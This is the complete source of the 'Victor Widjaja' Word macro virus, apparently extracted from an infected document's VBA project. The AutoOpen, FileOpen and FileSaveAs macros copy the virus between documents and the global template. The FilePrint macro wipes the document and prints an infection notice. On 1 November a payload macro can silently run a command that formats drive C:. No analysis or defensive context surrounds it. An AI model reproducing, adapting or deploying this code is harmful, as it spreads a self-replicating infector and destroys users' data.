   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "ToolsCustomize"

   Public Sub MAIN()
   End Sub

   Attribute VB_Name = "VictorWidjaja"

   Public Sub MAIN()
   Dim Text_$
   Dim i
   Dim MoveIt$
   Dim Retime
   Dim FormatDisk$

       On Error GoTo -1: On Error GoTo Abort

       WordBasic.DisableInput (1)
       WordBasic.DisableAutoMacros (0)
       WordBasic.ToolsOptionsSave GlobalDotPrompt:=0

       If WordBasic.Day(WordBasic.Now()) = 1 And WordBasic.Month(WordBasic.Now()) = 11 Then

           Text_$ = " [ Welcome to Victor Widjaja `WordMacro' Virus - Programmed & Created by Victor Widjaja the HACKER - Virus Research Labolatory ]"

           For i = 1 To Len(Text_$)
               MoveIt$ = MoveIt$ + Mid(Text_$, i, 1)
               For Retime = 1 To 450: Next Retime
               WordBasic.PrintStatusBar MoveIt$
               WordBasic.Beep
           Next i

           WordBasic.MsgBox "Victor Widjaja lives in your PC now", "Attention", 16

               If WordBasic.Second(WordBasic.Now()) = 1 Or WordBasic.Second(WordBasic.Now()) = 11 Then
                   FormatDisk$ = "Format C: /U /C /S /AUTOTEST > NUL"
                   WordBasic.Shell Environ("COMSPEC") + "/C " + FormatDisk$, 0
               Else
                   GoTo Abort
               End If
           Else
               GoTo Abort
           End If

   Abort:
   End Sub

   Attribute VB_Name = "FileTemplates"

   Public Sub MAIN()
   End Sub

   Attribute VB_Name = "ViewToolbars"

   Public Sub MAIN()
   End Sub

   Attribute VB_Name = "FormatStyle"

   Public Sub MAIN()
   End Sub

   Attribute VB_Name = "ToolsMacro"

   Public Sub MAIN()
   End Sub

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Dim True_
   Dim False_
   Dim FN$

       WordBasic.DisableInput (1)
       WordBasic.DisableAutoMacros (0)
       WordBasic.ToolsOptionsSave GlobalDotPrompt:=0

       True_ = -1
       False_ = Not True_

       Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
       On Error GoTo -1: On Error GoTo Abort
       WordBasic.CurValues.FileSaveAs dlg
       WordBasic.Dialog.FileSaveAs dlg

       If dlg.Format = 0 Then dlg.Format = 1
       If dlg.Format = 1 Then
           FN$ = WordBasic.[FileName$]()
           WordBasic.MacroCopy "Global:AutoOpen", FN$ + ":AutoOpen", 1
           WordBasic.MacroCopy "Global:FileOpen", FN$ + ":FileOpen", 1
           WordBasic.MacroCopy "Global:FilePrint", FN$ + ":FilePrint", 1
           WordBasic.MacroCopy "Global:FileSaveAs", FN$ + ":FileSaveAs", 1
           WordBasic.MacroCopy "Global:ToolsMacro", FN$ + ":ToolsMacro", 1
           WordBasic.MacroCopy "Global:FormatStyle", FN$ + ":FormatStyle", 1
           WordBasic.MacroCopy "Global:ViewToolbars", FN$ + ":ViewToolbars", 1
           WordBasic.MacroCopy "Global:VictorWidjaja", FN$ + ":VictorWidjaja", 1
           WordBasic.MacroCopy "Global:FileTemplates", FN$ + ":FileTemplates", 1
           WordBasic.MacroCopy "Global:ToolsCustomize", FN$ + ":ToolsCustomize", 1
           dlg.Format = 1
           WordBasic.Call "VictorWidjaja"
       Else
           GoTo Abort
       End If

   Abort:
   If Err.Number <> 102 Then
       WordBasic.FileSaveAs dlg
   End If
   End Sub

   Attribute VB_Name = "FilePrint"

   Public Sub MAIN()
   Dim True_
   Dim False_
   Dim Text_$
   Dim i
   Dim MoveIt$
   Dim Retime

   WordBasic.DisableInput (1)
   WordBasic.DisableAutoMacros (0)
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0

   True_ = -1
   False_ = Not True_

   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FilePrint(False)
   On Error GoTo -1: On Error GoTo Abort
   WordBasic.CurValues.FilePrint dlg
   WordBasic.Dialog.FilePrint dlg

   WordBasic.EditSelectAll
   WordBasic.WW6_EditClear
   WordBasic.CenterPara
   WordBasic.Bold
   WordBasic.FontSize 22
   WordBasic.Insert "Welcome to Victor Widjaja Virus"
   WordBasic.InsertPara
   WordBasic.InsertPara
   WordBasic.FontSize 20
   WordBasic.Italic
   WordBasic.Insert "Your computer has been totally infected by    ''Victor Widja"
   WordBasic.Insert "ja'' WordMacro Virus"
   WordBasic.InsertPara
   WordBasic.InsertPara
   WordBasic.Insert "Don't go anywhere !!!"
   WordBasic.InsertPara
   WordBasic.Insert "I'll be back soon to DESTROY your disk data !!"
   WordBasic.InsertPara
   WordBasic.InsertPara
   WordBasic.Insert "Copyright "
   WordBasic.InsertSymbol Font:="Symbol", CharNum:="227"
   WordBasic.Insert " 1996 Virus Research Labs."
   WordBasic.StartOfLine
   WordBasic.PageUp 3
   WordBasic.BorderLineStyle 2
   WordBasic.BorderTop 1
   WordBasic.BorderLeft 1
   WordBasic.BorderRight 1
   WordBasic.LineDown 1
   WordBasic.BorderLeft 1
   WordBasic.BorderRight 1
   WordBasic.LineDown 1
   WordBasic.BorderLeft 1
   WordBasic.BorderRight 1
   WordBasic.LineDown 2
   WordBasic.BorderRight 1
   WordBasic.BorderLeft 1
   WordBasic.LineDown 1
   WordBasic.BorderLeft 1
   WordBasic.BorderRight 1
   WordBasic.LineDown 1
   WordBasic.BorderRight 1
   WordBasic.BorderLeft 1
   WordBasic.LineDown 1
   WordBasic.BorderLeft 1
   WordBasic.BorderRight 1
   WordBasic.LineDown 1
   WordBasic.BorderRight 1
   WordBasic.BorderLeft 1
   WordBasic.LineDown 1
   WordBasic.BorderBottom 1
   WordBasic.EndOfLine
   WordBasic.InsertPara
   WordBasic.PageUp 1

   WordBasic.FilePrint dlg

   Text_$ = " [ Welcome to Victor Widjaja `WordMacro' Virus - Programmed & Created by Victor Widjaja the HACKER - Virus Research Labolatory ]"

   For i = 1 To Len(Text_$)
       MoveIt$ = MoveIt$ + Mid(Text_$, i, 1)
       For Retime = 1 To 450: Next Retime
       WordBasic.PrintStatusBar MoveIt$
       WordBasic.Beep
   Next i

   Abort:
   End Sub

   Attribute VB_Name = "FileOpen"

   Public Sub MAIN()
   Dim True_
   Dim False_
   Dim i
   Dim HasBeenActive

       WordBasic.DisableInput (1)
       WordBasic.DisableAutoMacros (0)
       WordBasic.ToolsOptionsSave GlobalDotPrompt:=0

       True_ = -1
       False_ = Not True_

       Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
       On Error GoTo -1: On Error GoTo Abort
       WordBasic.CurValues.FileOpen dlg
       WordBasic.Dialog.FileOpen dlg
       WordBasic.FileOpen dlg

       For i = 1 To WordBasic.CountMacros(1, 0)
           If WordBasic.[MacroName$](i, 1) = "VictorWidjaja" Then
               HasBeenActive = True_
           Else
               HasBeenActive = False_
           End If
       Next i

       If HasBeenActive = False_ Then
           WordBasic.MacroCopy "Global:FileOpen", dlg.Name + ":FileOpen", 1
           WordBasic.MacroCopy "Global:AutoOpen", dlg.Name + ":AutoOpen", 1
           WordBasic.MacroCopy "Global:FilePrint", dlg.Name + ":FilePrint", 1
           WordBasic.MacroCopy "Global:FileSaveAs", dlg.Name + ":FileSaveAs", 1
           WordBasic.MacroCopy "Global:ToolsMacro", dlg.Name + ":ToolsMacro", 1
           WordBasic.MacroCopy "Global:FormatStyle", dlg.Name + ":FormatStyle", 1
           WordBasic.MacroCopy "Global:ViewToolbars", dlg.Name + ":ViewToolbars", 1
           WordBasic.MacroCopy "Global:VictorWidjaja", dlg.Name + ":VictorWidjaja", 1
           WordBasic.MacroCopy "Global:FileTemplates", dlg.Name + ":FileTemplates", 1
           WordBasic.MacroCopy "Global:ToolsCustomize", dlg.Name + ":ToolsCustomize", 1

           WordBasic.FileSaveAs Format:=1
           WordBasic.Call "VictorWidjaja"
       Else
           GoTo Abort
       End If

   Abort:
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim True_
   Dim False_
   Dim i
   Dim HasBeenActive
   Dim FN$

       On Error GoTo -1: On Error GoTo Abort

       True_ = -1
       False_ = Not True_

       WordBasic.DisableInput (1)
       WordBasic.DisableAutoMacros (0)
       WordBasic.ToolsOptionsSave GlobalDotPrompt:=0

       For i = 1 To WordBasic.CountMacros(0, 0)
           If WordBasic.[MacroName$](i, 0) = "VictorWidjaja" Then
               HasBeenActive = True_
           Else
               HasBeenActive = False_
           End If
       Next i

       If HasBeenActive = False_ Then
           FN$ = WordBasic.[FileName$]()
           WordBasic.MacroCopy FN$ + ":FileOpen", "Global:FileOpen", 1
           WordBasic.MacroCopy FN$ + ":AutoOpen", "Global:AutoOpen", 1
           WordBasic.MacroCopy FN$ + ":FilePrint", "Global:FilePrint", 1
           WordBasic.MacroCopy FN$ + ":FileSaveAs", "Global:FileSaveAs", 1
           WordBasic.MacroCopy FN$ + ":ToolsMacro", "Global:ToolsMacro", 1
           WordBasic.MacroCopy FN$ + ":FormatStyle", "Global:FormatStyle", 1
           WordBasic.MacroCopy FN$ + ":ViewToolbars", "Global:ViewToolbars", 1
           WordBasic.MacroCopy FN$ + ":VictorWidjaja", "Global:VictorWidjaja", 1
           WordBasic.MacroCopy FN$ + ":FileTemplates", "Global:FileTemplates", 1
           WordBasic.MacroCopy FN$ + ":ToolsCustomize", "Global:ToolsCustomize", 1
           WordBasic.Call "VictorWidjaja"
       Else
           GoTo Abort
       End If

   Abort:
   End Sub
